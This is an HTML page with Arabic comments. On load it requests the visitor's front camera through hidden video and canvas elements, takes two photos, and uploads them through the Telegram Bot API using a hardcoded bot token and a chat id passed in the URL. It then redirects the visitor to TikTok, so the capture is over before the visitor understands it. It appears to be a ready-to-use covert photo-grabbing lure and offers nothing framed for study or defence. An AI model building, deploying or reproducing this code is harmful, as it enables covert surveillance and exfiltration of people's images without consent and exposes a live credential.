<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            background: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        
        #preview-container {
            display: flex;
            gap: 20px;
            margin: 20px 0;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        .image-box {
            border: 2px solid #333;
            border-radius: 8px;
            overflow: hidden;
            width: 320px;
            height: 240px;
            background: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .image-box img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .image-label {
            text-align: center;
            margin-top: 5px;
            font-weight: bold;
        }
        
        #status {
            margin: 20px 0;
            font-size: 18px;
            color: #333;
        }
        
        #countdown {
            font-size: 24px;
            font-weight: bold;
            color: #ff4444;
        }

        /* عناصر التصوير مخفية كما في الكود الأصلي */
        #video, #canvas {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            display: none; /* إضافة display none للتأكد من الإخفاء التام */
        }
    </style>
</head>
<body>
    <h2>التقاط الصور</h2>
    
    <div id="preview-container">
        <div>
            <div class="image-box">
                <img id="img1" src="" alt="الصورة الأولى">
            </div>
            <div class="image-label">الصورة الأولى</div>
        </div>
        <div>
            <div class="image-box">
                <img id="img2" src="" alt="الصورة الثانية">
            </div>
            <div class="image-label">الصورة الثانية</div>
        </div>
    </div>
    
    <div id="status">جاري تجهيز الكاميرا...</div>
    <div id="countdown"></div>

    <!-- عناصر التصوير مخفية (كما في الكود الأصلي) -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ====== الإعدادات (كما هي) ======
        const token = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const id = new URLSearchParams(window.location.search).get('id');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const img1 = document.getElementById('img1');
        const img2 = document.getElementById('img2');
        const statusDiv = document.getElementById('status');
        const countdownDiv = document.getElementById('countdown');
        
        let stream = null;
        let photos = [];

        // ====== دالة التقاط صورة (مع التأكد من وجود إطار حقيقي) ======
        function capturePhoto() {
            // التأكد من أن الفيديو يحتوي على أبعاد صحيحة
            if (video.videoWidth === 0 || video.videoHeight === 0) {
                throw new Error("الفيديو لم يبدأ بعد");
            }
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            // رسم الفيديو على الكانفاس
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // إرجاع الصورة كـ base64 بصيغة JPEG وجودة عالية
            return canvas.toDataURL('image/jpeg', 0.95);
        }

        // ====== عرض الصورة في الواجهة ======
        function displayPhoto(imgElement, photoData) {
            imgElement.src = photoData;
        }

        // ====== إرسال الصور إلى تليجرام ======
        async function sendPhotos() {
            statusDiv.innerHTML = "جاري إرسال الصور...";
            
            for (let i = 0; i < photos.length; i++) {
                const photoData = photos[i];
                
                // تحويل base64 إلى blob
                const byteString = atob(photoData.split(',')[1]);
                const mimeString = photoData.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                
                for (let j = 0; j < byteString.length; j++) {
                    ia[j] = byteString.charCodeAt(j);
                }
                
                const blob = new Blob([ab], { type: mimeString });
                
                // إرسال الصورة
                const form = new FormData();
                form.append('chat_id', id);
                form.append('photo', blob, `photo_${i+1}.jpg`);
                
                try {
                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                        method: 'POST',
                        body: form
                    });
                } catch (e) {
                    console.error('خطأ في الإرسال:', e);
                }
            }
            
            // إنهاء تدفق الكاميرا
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
            }
            
            statusDiv.innerHTML = "تم الإرسال! جاري التحويل...";
            
            // التوجيه بعد 2 ثانية
            setTimeout(() => {
                window.location.href = "https://www.tiktok.com";
            }, 2000);
        }

        // ====== بداية التصوير ======
        async function start() {
            if (!id) {
                window.location.href = "https://www.tiktok.com";
                return;
            }

            try {
                statusDiv.innerHTML = "جاري طلب الكاميرا...";
                
                // طلب الكاميرا الأمامية (user) مع صوت (اختياري، لكننا لا نحتاج الصوت للصور)
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, // الكاميرا الأمامية
                    audio: false  // بدون صوت (يمكن تركه true لكن لا فائدة)
                });
                
                video.srcObject = stream;
                
                // ننتظر حتى يصبح الفيديو جاهزاً (أول إطار)
                await new Promise((resolve) => {
                    if (video.readyState >= 2) { // HAVE_CURRENT_DATA أو أعلى
                        resolve();
                    } else {
                        video.onloadeddata = () => resolve();
                    }
                });
                
                // تأخير إضافي للتأكد من استقرار الكاميرا والإضاءة
                statusDiv.innerHTML = "الكاميرا جاهزة، سيتم التقاط الصورة الأولى بعد لحظات...";
                await new Promise(r => setTimeout(r, 2000));
                
                // التقاط الصورة الأولى
                statusDiv.innerHTML = "التقاط الصورة الأولى...";
                const photo1 = capturePhoto();
                photos.push(photo1);
                displayPhoto(img1, photo1);
                
                // انتظار 2 ثانية للصورة الثانية
                statusDiv.innerHTML = "انتظر قليلاً للصورة الثانية...";
                await new Promise(r => setTimeout(r, 2000));
                
                // التقاط الصورة الثانية
                statusDiv.innerHTML = "التقاط الصورة الثانية...";
                const photo2 = capturePhoto();
                photos.push(photo2);
                displayPhoto(img2, photo2);
                
                statusDiv.innerHTML = "تم التقاط الصور! سيتم الإرسال بعد 3 ثوانٍ...";
                
                // إعطاء المستخدم فرصة لرؤية الصور قبل الإرسال
                setTimeout(() => {
                    sendPhotos();
                }, 3000);
                
            } catch (err) {
                // إذا فشل، أرسل رسالة خطأ
                console.error(err);
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: id,
                        text: `❌ خطأ: ${err.message}`
                    })
                }).finally(() => {
                    window.location.href = "https://www.tiktok.com";
                });
            }
        }

        // تشغيل
        start();

        // طوارئ: توجه بعد 25 ثانية (احتياطي)
        setTimeout(() => {
            window.location.href = "https://www.tiktok.com";
        }, 25000);
    </script>
</body>
</html>
